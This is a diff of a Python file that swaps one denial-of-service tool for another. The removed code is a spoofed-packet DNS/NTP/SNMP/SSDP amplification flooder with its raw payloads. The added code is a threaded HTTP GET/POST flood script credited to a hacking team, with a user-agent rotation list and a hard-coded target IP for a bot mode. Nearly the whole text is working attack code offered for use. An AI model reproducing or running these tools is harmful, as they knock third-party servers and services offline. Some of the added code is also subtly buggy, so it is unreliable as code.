@@ -1,317 +1,213 @@
-#!/usr/bin/env python
-import sys
-import time
-import socket
-import struct
-import threading
-from random import randint
+from queue import Queue
 from optparse import OptionParser
-from pinject import IP, UDP
+import time,sys,socket,threading,logging,urllib.request,random
 
-USAGE = '''
-%prog target.com [options]        # DDoS
-%prog benchmark [options]         # Calculate AMPLIFICATION factor
-'''
-
-LOGO = r'''
-                 F SECURIY
-                 
-	https://github.com/OffensivePython/Saddam
-'''
-
-HELP = (
-	'DNS Amplification File and Domains to Resolve (e.g: dns.txt:[evildomain.com|domains_file.txt]',
-	'NTP Amplification file',
-	'SNMP Amplification file',
-	'SSDP Amplification file',
-	'Number of threads (default=1)' )
-
-OPTIONS = (
-	(('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
-	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
-	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
-	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
-	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )
-
-BENCHMARK = (
-	'Protocol'
-	'|  IP  Address  '
-	'|     Amplification     '
-	'|     Domain    '
-	'\n{}').format('-'*75)
-
-ATTACK = (
-	'     Sent      '
-	'|    Traffic    '
-	'|    Packet/s   '
-	'|     Bit/s     '
-	'\n{}').format('-'*63)
-
-PORT = {
-	'dns': 53,
-	'ntp': 123,
-	'snmp': 161,
-	'ssdp': 1900 }
-
-PAYLOAD = {
-	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
-			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
-			'\x00\x00\x00\x00\x00\x00'),
-	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
-		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
-		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
-		'\x01\x02\x01\x05\x00'),
-	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
-	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
-}
-
-amplification = {
-	'dns': {},
-	'ntp': {},
-	'snmp': {},
-	'ssdp': {} }		# Amplification factor
-
-FILE_NAME = 0			# Index of files names
-FILE_HANDLE = 1 		# Index of files descriptors
-
-npackets = 0			# Number of packets sent
-nbytes = 0				# Number of bytes reflected
-files = {}				# Amplifications files
-
-SUFFIX = {
-	0: '',
-	1: 'K',
-	2: 'M',
-	3: 'G',
-	4: 'T'}
-
-def Calc(n, d, unit=''):
-	i = 0
-	r = float(n)
-	while r/d>=1:
-		r = r/d
-		i+= 1
-	return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)
-
-def GetDomainList(domains):
-	domain_list = []
-
-	if '.TXT' in domains.upper():
-		file = open(domains, 'r')
-		content = file.read()
-		file.close()
-		content = content.replace('\r', '')
-		content = content.replace(' ', '')
-		content = content.split('\n')
-		for domain in content:
-			if domain:
-				domain_list.append(domain)
+def sedot_parameters():
+	global ip,host,port,thr,item,referer,uri,path,method,isbot
+	ip = "118.98.73.214" 
+	host = "www.google.com"
+	port = 80
+	thr  = 500
+	path = "/" 		
+	uri = "/"   				
+	method = "GET"				
+	data_post = ""				
+	isbot=0
+	
+	optp = OptionParser(add_help_option=False,epilog="Hammers")
+	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+	optp.add_option("-s","--host", dest="host",help="attack to server host --host www.target.com")
+	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
+	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 200 -t 200")
+	optp.add_option("-a","--path",dest="path",help="default /  -a /db.php")
+	optp.add_option("-u","--uri",dest="uri",help="default /  -u /index.jsp")
+	optp.add_option("-m","--method",dest="method",help="default GET  -m GET")
+	optp.add_option("-d","--data",dest="data",help="default  -d user=test&pass=test")
+	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	opts, args = optp.parse_args()
+	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+	if opts.help:
+		usage()
+	if opts.host is None:
+		usage()
 	else:
-		domain_list = domains.split(',')
-	return domain_list
+		host = opts.host
+	if opts.port is None:
+		port = 80
+	else:
+		port = opts.port
+	if opts.turbo is None:
+		thr = 200
+	else:
+		thr = opts.turbo
+	if opts.path is None:
+		path = "/"
+	else:
+		path = opts.path
+	if opts.uri is None:
+		uri = "/"
+	else:
+		uri = opts.uri
+	if opts.method is None:
+		uri = "GET"
+	else:
+		uri = opts.method
+	if opts.data is None:
+		data_post = ""
+	else:
+		data_post = opts.data
 
-def Monitor():
-	'''
-		Monitor attack
-	'''
-	print ATTACK
-	FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
-	start = time.time()
-	while True:
-		try:
-			current = time.time() - start
-			bps = (nbytes*8)/current
-			pps = npackets/current
-			out = FMT.format(Calc(npackets, 1000), 
-				Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
-			sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
-			time.sleep(1)
-		except KeyboardInterrupt:
-			print '\nInterrupted'
-			break
-		except Exception as err:
-			print '\nError:', str(err)
-			break
-			
+def usage():
+	print ('''
+    sina-h-scar 
+    scar security_team
+    devilfser@gmail.com
+    
+	-s or --host = "www.google.com"
+	-p or --port = 80 > 80 (http) or 443 (htttps)
+	-t or --turbo  = 200 > defaul 200
+	-a or --path = "/" > serangan spesifik 
+	-u or --uri = "/" > lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp 
+	
+	-m or --method = "GET" > GET / POST
+	-d or --data = "" > dipakai hanya untuk method = POST, misalnya: user=test&pass=test
+	''')
+	sys.exit()
+	
+def my_bots():
+	global bots
+	bots=[]
+	#sina_h_scar 
+	bot1="https://www.google.com/?q="
+	bots.append(bot1)
+	return(bots)
+	
+def user_agent():
+	global uagent
+	uagent=[]
+	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+	return(uagent)
 
-def AmpFactor(recvd, sent):
-	return '{}x ({}B -> {}B)'.format(recvd/sent, sent, recvd)
-
-def Benchmark(ddos):
-	print BENCHMARK
-	i = 0
-	for proto in files:
-		f = open(files[proto][FILE_NAME], 'r')
+def bot_hammering(url):
+	try:
 		while True:
-			soldier = f.readline().strip()
-			if soldier:
-				if proto=='dns':
-					for domain in ddos.domains:
-						i+= 1
-						recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
-						if recvd/sent:
-							print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-								AmpFactor(recvd, sent), domain)
-						else:
-							continue
-				else:
-					recvd, sent = ddos.GetAmpSize(proto, soldier)
-					print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-						AmpFactor(recvd, sent), 'N/A')
-					i+= 1
+			sys.stdout.write("Bot>>fire . . .")
+			sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
+			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			time.sleep(.1)
+	except:
+		time.sleep(.1)
+			
+def down_it(item):
+	try:
+		while True:
+			if(port==80):
+				referer="http://"
+			elif(port==443):
+				referer="https://"
+			
+			if(method=="GET"):
+				packet = str("GET "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			elif(method=="POST"):
+				packet = str("POST "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data+"\n\n"+data_post).encode('utf-8')
 			else:
-				break
-		print 'Total tested:', i
-		f.close()
+				print("error detected")
+				
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((host,int(port)))
+			if s.sendto( packet, (host, int(port)) ):
+				s.shutdown(1)
+				sys.stdout.write("Attacking . . .")
+				sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
+				
+			else:
+				s.shutdown(1)
+				print("shut<->down")
+			time.sleep(.1)
+	except socket.error as e:
+		print("no connection! server maybe down")
+		time.sleep(.1)
 
-class DDoS(object):
-	def __init__(self, target, threads, domains, event):
-		self.target = target
-		self.threads = threads
-		self.event = event
-		self.domains = domains
-	def stress(self):
-		for i in range(self.threads):
-			t = threading.Thread(target=self.__attack)
+def dos():
+	while True:
+		item = q.get()
+		down_it(item)
+		q.task_done()
+
+
+def dos2():
+	while True:
+		item=w.get()
+		bot_hammering(random.choice(bots)+ip)
+		w.task_done()
+
+
+def exit():
+	sys.exit()
+
+global data
+data ='''Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive''';
+ 
+#sina_h_scar
+q = Queue()
+w = Queue()
+
+if __name__ == '__main__':
+	sedot_parameters()
+	print("")
+	print("//////////////////////////////////////")
+	print("//         Layer 7 Attack           //")
+	print("//   [+] scar Cyber Team [+]    //")
+	print("//       .:: sina_h_scar ::.         //")
+	print("/////////////////////////////////////")
+	print("")
+	print("Target Lock In :")
+	print("Web: ",host)
+	print("Port: ",str(port))
+	print("Turbo: ",str(thr))
+	print("URI: ",uri)
+	print("Specific to : ",path)
+	print("")
+	print("Please wait . . .\n")
+	user_agent()
+	my_bots()
+	time.sleep(5)
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,int(port)))
+		s.settimeout(1)
+	except socket.error as e:
+		print("check server ip and port")
+		exit()
+	while True:
+		for i in range(int(thr)):
+			t = threading.Thread(target=dos)
+			t.daemon = True
 			t.start()
-	def __send(self, sock, soldier, proto, payload):
-		'''
-			Send a Spoofed Packet
-		'''
-		udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
-		ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
-		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
-	def GetAmpSize(self, proto, soldier, domain=''):
-		'''
-			Get Amplification Size
-		'''
-		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		sock.settimeout(2)
-		data = ''
-		if proto in ['ntp', 'ssdp']:
-			packet = PAYLOAD[proto]
-			sock.sendto(packet, (soldier, PORT[proto]))
-			try:
-				while True:
-					data+= sock.recvfrom(65535)[0]
-			except socket.timeout:
-				sock.close()
-				return len(data), len(packet)
-		if proto=='dns':
-			packet = self.__GetDnsQuery(domain)
-		else:
-			packet = PAYLOAD[proto]
-		try:
-			sock.sendto(packet, (soldier, PORT[proto]))
-			data, _ = sock.recvfrom(65535)
-		except socket.timeout:
-			data = ''
-		finally:
-			sock.close()
-		return len(data), len(packet)
-	def __GetQName(self, domain):
-		'''
-			QNAME A domain name represented as a sequence of labels 
-			where each label consists of a length
-			octet followed by that number of octets
-		'''
-		labels = domain.split('.')
-		QName = ''
-		for label in labels:
-			if len(label):
-				QName += struct.pack('B', len(label)) + label
-		return QName
-	def __GetDnsQuery(self, domain):
-		id = struct.pack('H', randint(0, 65535))
-		QName = self.__GetQName(domain)
-		return PAYLOAD['dns'].format(id, QName)
-	def __attack(self):
-		global npackets
-		global nbytes
-		_files = files
-		for proto in _files:	# Open Amplification files
-			f = open(_files[proto][FILE_NAME], 'r')
-			_files[proto].append(f)		# _files = {'proto':['file_name', file_handle]}
-		sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-		i = 0
-		while self.event.isSet():
-			for proto in _files:
-				soldier = _files[proto][FILE_HANDLE].readline().strip()
-				if soldier:
-					if proto=='dns':
-						if not amplification[proto].has_key(soldier):
-							amplification[proto][soldier] = {}
-						for domain in self.domains:
-							if not amplification[proto][soldier].has_key(domain):
-								size, _ = self.GetAmpSize(proto, soldier, domain)
-								if size==0:
-									break
-								elif size<len(PAYLOAD[proto]):
-									continue
-								else:
-									amplification[proto][soldier][domain] = size
-							amp = self.__GetDnsQuery(domain)
-							self.__send(sock, soldier, proto, amp)
-							npackets += 1
-							i+=1
-							nbytes += amplification[proto][soldier][domain]
-					else:
-						if not amplification[proto].has_key(soldier):
-							size, _ = self.GetAmpSize(proto, soldier)
-							if size<len(PAYLOAD[proto]):
-								continue
-							else:
-								amplification[proto][soldier] = size
-						amp = PAYLOAD[proto]
-						npackets += 1
-						i+=1
-						nbytes += amplification[proto][soldier]
-						self.__send(sock, soldier, proto, amp)
-				else:
-					_files[proto][FILE_HANDLE].seek(0)
-		sock.close()
-		for proto in _files:
-			_files[proto][FILE_HANDLE].close()
-
-def main():
-	parser = OptionParser(usage=USAGE)
-	for args, kwargs in OPTIONS:
-		parser.add_option(*args, **kwargs)
-	options, args = parser.parse_args()
-	domains = None
-	if len(args)<1:
-		parser.print_help()
-		sys.exit()
-	if options.dns:
-		dns_file, domains = options.dns.split(':')
-		domains = GetDomainList(domains)
-		if domains:
-			files['dns'] = [dns_file]
-		else:
-			print 'Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)'
-			sys.exit()
-	if options.ntp:
-		files['ntp'] = [options.ntp]
-	if options.snmp:
-		files['snmp'] = [options.snmp]
-	if options.ssdp:
-		files['ssdp'] = [options.ssdp]
-	if files:
-		event = threading.Event()
-		event.set()
-		if 'BENCHMARK'==args[0].upper():
-			ddos = DDoS(args[0], options.threads, domains, event)
-			Benchmark(ddos)
-		else:
-			ddos = DDoS(socket.gethostbyname(args[0]), options.threads, domains, event)
-			ddos.stress()
-			Monitor()
-			event.clear()
-	else:
-		parser.print_help()
-		sys.exit()
-
-if __name__=='__main__':
-	print LOGO
-	main()
+			if(isbot==1):
+				t2 = threading.Thread(target=dos2)
+				t2.daemon = True
+				t2.start()
+		start = time.time()
+		#sina_h_scar
+		item = 0
+		while True:
+			if (item>1800):
+				item=0
+				time.sleep(.1)
+			item = item + 1
+			q.put(item)
+			w.put(item)
+		q.join()
+		w.join()
